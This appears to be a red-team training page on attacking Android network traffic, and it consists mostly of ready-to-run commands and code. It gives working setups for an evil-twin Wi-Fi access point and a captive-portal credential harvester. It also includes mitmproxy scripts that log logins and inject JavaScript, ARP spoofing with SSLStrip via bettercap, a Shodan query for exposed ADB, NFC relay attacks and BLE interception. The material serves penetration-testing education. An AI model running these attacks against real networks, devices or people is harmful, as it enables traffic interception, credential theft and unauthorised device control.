---
layout: training-page
title: "Android Network Attacks — Red Team Academy"
module: "Mobile Security"
tags:
  - android
  - network
  - mitm
  - traffic-interception
  - wifi
page_key: "mobile-android-network-attacks"
---
<h1>Android Network Attacks</h1>
<p>Intercepting, modifying, and exploiting network traffic from Android devices — beyond basic Burp proxy setup. Covers MITM attacks, traffic analysis, rogue access points targeting Android clients, and exploiting Android-specific network behaviors.</p>

<h2>Traffic Interception Without Proxy Settings</h2>
<h3>Transparent Proxy with iptables (Rooted Device)</h3>
<pre><code># Redirect all HTTP/HTTPS traffic to Burp without configuring proxy settings
# Useful when app ignores system proxy or uses non-HTTP protocols

# On the rooted device:
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 80 \
    -j DNAT --to-destination 10.10.14.5:8080"
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 443 \
    -j DNAT --to-destination 10.10.14.5:8080"

# In Burp: Proxy &gt; Options &gt; enable "Support invisible proxying"

# Capture non-HTTP traffic (any TCP port)
adb shell su -c "iptables -t nat -A OUTPUT -p tcp \
    -j DNAT --to-destination 10.10.14.5:8080"

# Clean up iptables rules when done
adb shell su -c "iptables -t nat -F OUTPUT"</code></pre>

<h3>tcpdump on Device</h3>
<pre><code># Capture all network traffic directly on the device (requires root)

# Push tcpdump binary (or use one from Termux)
adb push tcpdump /data/local/tmp/
adb shell chmod +x /data/local/tmp/tcpdump

# Capture all traffic
adb shell su -c "/data/local/tmp/tcpdump -i wlan0 -w /sdcard/capture.pcap"

# Capture only target app's traffic (by UID)
APP_UID=$(adb shell dumpsys package com.target.app | grep userId= | head -1 | grep -o '[0-9]*')
adb shell su -c "/data/local/tmp/tcpdump -i wlan0 \
    -w /sdcard/capture.pcap \
    '(ip and (uid $APP_UID))'"

# Pull and analyze in Wireshark
adb pull /sdcard/capture.pcap ./
wireshark capture.pcap</code></pre>

<h3>mitmproxy for Programmatic Interception</h3>
<pre><code># mitmproxy — scriptable MITM proxy (alternative to Burp)
pip install mitmproxy

# Start transparent proxy
mitmproxy --mode transparent --listen-host 0.0.0.0 --listen-port 8080

# Scripted interception — log all API calls with credentials
# save as log_creds.py:
# from mitmproxy import http
# def response(flow: http.HTTPFlow):
#     if "auth" in flow.request.pretty_url or "login" in flow.request.pretty_url:
#         print(f"[CRED] {flow.request.method} {flow.request.pretty_url}")
#         print(f"  Request: {flow.request.get_text()[:500]}")
#         print(f"  Response: {flow.response.get_text()[:500]}")

mitmproxy --mode transparent -s log_creds.py

# Modify responses on the fly
# save as inject.py:
# from mitmproxy import http
# def response(flow: http.HTTPFlow):
#     if flow.request.pretty_url.endswith(".js"):
#         flow.response.text += "\nalert('XSS via MITM');"

mitmproxy --mode transparent -s inject.py</code></pre>

<h2>Rogue Access Point Attacks</h2>
<h3>Evil Twin with hostapd</h3>
<pre><code># Create a rogue Wi-Fi AP that mimics a legitimate network
# Android devices auto-connect to known SSIDs

# Requirements: Wi-Fi adapter supporting AP mode (e.g., Alfa AWUS036ACH)

# Install hostapd + dnsmasq
sudo apt install hostapd dnsmasq

# hostapd.conf
cat &gt; /tmp/hostapd.conf &lt;&lt;'CONF'
interface=wlan1
driver=nl80211
ssid=CoffeeShop_Free_WiFi
hw_mode=g
channel=6
wmm_enabled=0
auth_algs=1
wpa=2
wpa_passphrase=coffeeshop123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
CONF

# dnsmasq.conf (DHCP + DNS for clients)
cat &gt; /tmp/dnsmasq.conf &lt;&lt;'CONF'
interface=wlan1
dhcp-range=192.168.100.10,192.168.100.100,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
log-queries
CONF

# Configure interface
sudo ip addr add 192.168.100.1/24 dev wlan1
sudo ip link set wlan1 up

# Enable NAT (route client traffic to internet)
sudo sysctl net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Start AP
sudo hostapd /tmp/hostapd.conf &amp;
sudo dnsmasq -C /tmp/dnsmasq.conf --no-daemon &amp;

# Now intercept traffic from connected Android devices
# Route through mitmproxy/Burp for inspection
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 \
    -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 \
    -j REDIRECT --to-port 8080</code></pre>

<h3>Open Network Lure (Captive Portal)</h3>
<pre><code># Android auto-opens a captive portal detection page when connecting
# to a network that returns a non-204 response to connectivity checks
# We can serve a phishing page here

# Android connectivity check URLs:
# https://connectivitycheck.gstatic.com/generate_204
# http://connectivitycheck.gstatic.com/generate_204
# http://www.google.com/gen_204

# DNS redirect these domains to our server
# In dnsmasq.conf:
# address=/connectivitycheck.gstatic.com/192.168.100.1
# address=/clients3.google.com/192.168.100.1

# Serve a fake captive portal (credential harvester)
# Use Social-Engineer Toolkit or custom Flask app:
# from flask import Flask, request, redirect
# app = Flask(__name__)
# @app.route("/generate_204")
# def captive():
#     return redirect("/login")
# @app.route("/login", methods=["GET", "POST"])
# def login():
#     if request.method == "POST":
#         log_creds(request.form)
#         return "&lt;h1&gt;Connected! Enjoy free WiFi.&lt;/h1&gt;"
#     return LOGIN_FORM_HTML
# app.run(host="0.0.0.0", port=80)</code></pre>

<h2>Exploiting Android-Specific Protocols</h2>
<h3>ADB over Network</h3>
<pre><code># ADB can run over TCP — if enabled, full device control without USB

# Scan for exposed ADB ports
nmap -p 5555 192.168.1.0/24 --open

# Connect to exposed ADB
adb connect 192.168.1.100:5555
adb shell

# Many IoT/smart devices run Android with ADB exposed:
# - Smart TVs (Android TV)
# - Set-top boxes
# - Car infotainment systems
# - Industrial tablets

# Some apps enable ADB over network for "remote management"
# Shodan dork: port:5555 product:"Android Debug Bridge"</code></pre>

<h3>Chromecast / mDNS Discovery</h3>
<pre><code># Android devices advertise services via mDNS (Bonjour)
# Discover what's on the network:
avahi-browse -art

# Chromecast takeover — cast to discovered devices
# If on the same network, can cast arbitrary content
# Useful for social engineering demonstrations

# Discover Android devices specifically
nmap -sV -p 8008,8009,8443 192.168.1.0/24
# Port 8008/8009 = Chromecast/Google Home API</code></pre>

<h3>Android Beam / NFC</h3>
<pre><code># Android Beam (deprecated but still on older devices)
# Can push URLs, apps, contacts via NFC tap
# Use Flipper Zero or NFC writer to create malicious NFC tags

# NFCGate — relay and replay NFC communications
# github.com/nfcgate/nfcgate
# Install on two rooted Android devices
# Device 1 (at ATM/terminal): reads NFC card data
# Device 2 (remote): replays card data at another terminal

# Malicious NFC tag payloads:
# - URL pointing to malware download
# - Wi-Fi config auto-connecting to evil twin
# - Trigger app launch via Android Application Record</code></pre>

<h2>Certificate Manipulation Attacks</h2>
<h3>Custom CA Injection (System Level)</h3>
<pre><code># Install a custom CA cert as system-trusted (requires root)
# This bypasses network_security_config restrictions

# Convert cert to Android system format
HASH=$(openssl x509 -inform PEM -subject_hash_old -in ca.pem | head -1)
cp ca.pem ${HASH}.0

# Push to system cert store
adb root
adb remount
adb push ${HASH}.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/${HASH}.0
adb reboot

# For Magisk-rooted devices (non-persistent /system):
# Use MagiskTrustUserCerts module
# It copies user-installed CAs to system store on boot</code></pre>

<h3>SSLStrip on Android Traffic</h3>
<pre><code># Downgrade HTTPS to HTTP for apps not enforcing HSTS

# On attacker machine (MITM position):
pip install sslstrip2
sslstrip2 --listen 10000 --all

# iptables redirect
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 \
    -j REDIRECT --to-port 10000

# Modern apps typically use HTTPS-only, but:
# - WebView content may load HTTP resources
# - Some older apps still use HTTP for non-sensitive endpoints
# - API calls may fallback to HTTP on cert errors (misconfig)

# Better approach: use bettercap
sudo bettercap -iface wlan1
&gt; set http.proxy.sslstrip true
&gt; set net.sniff.verbose true
&gt; http.proxy on
&gt; net.sniff on
&gt; arp.spoof on</code></pre>

<h2>Frida Network Hooking</h2>
<pre><code># Hook network APIs to intercept/modify traffic at the app level
# Bypasses SSL pinning AND network security config

# Hook OkHttp to log all requests/responses:
# save as okhttp_logger.js
Java.perform(function() {
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var Interceptor = Java.use("okhttp3.Interceptor");

    // Hook the internal call that processes all requests
    var RealCall = Java.use("okhttp3.internal.connection.RealCall");
    RealCall.getResponseWithInterceptorChain.implementation = function() {
        var response = this.getResponseWithInterceptorChain();
        var request = this.request();
        console.log("[HTTP] " + request.method() + " " + request.url());
        // Log headers
        var headers = request.headers();
        for (var i = 0; i &lt; headers.size(); i++) {
            console.log("  " + headers.name(i) + ": " + headers.value(i));
        }
        return response;
    };
});

# Run: frida -U -f com.target.app -l okhttp_logger.js --no-pause

# Hook WebSocket communications:
Java.perform(function() {
    var WebSocket = Java.use("okhttp3.internal.ws.RealWebSocket");
    WebSocket.send.overload("java.lang.String").implementation = function(text) {
        console.log("[WS SEND] " + text);
        return this.send(text);
    };
});</code></pre>

<h2>Bluetooth MITM</h2>
<pre><code># Intercept Bluetooth communications between Android and peripherals
# Useful for: fitness trackers, smart locks, medical devices, car systems

# btlejack — BLE sniffing and MITM
# github.com/virtualabs/btlejack
pip install btlejack

# Scan for BLE connections
btlejack -s

# Sniff an existing connection
btlejack -f 0x12345678   # access address from scan

# MITM a BLE connection
btlejack -f 0x12345678 -m

# Wireshark for Bluetooth analysis
# Enable btbb and bluetooth dissectors
# Import btlejack captures for analysis

# GATTacker — BLE MITM framework
# github.com/AresS31/GATTacker
# Clones a BLE peripheral and sits between device and target</code></pre>

<h2>Resources</h2>
<ul>
  <li>mitmproxy — <code>mitmproxy.org</code></li>
  <li>bettercap — <code>github.com/bettercap/bettercap</code></li>
  <li>hostapd — <code>w1.fi/hostapd/</code></li>
  <li>NFCGate — <code>github.com/nfcgate/nfcgate</code></li>
  <li>btlejack — <code>github.com/virtualabs/btlejack</code></li>
  <li>OWASP MASTG Network Testing — <code>mas.owasp.org/MASTG/Android/0x05g-Testing-Network-Communication/</code></li>
</ul>
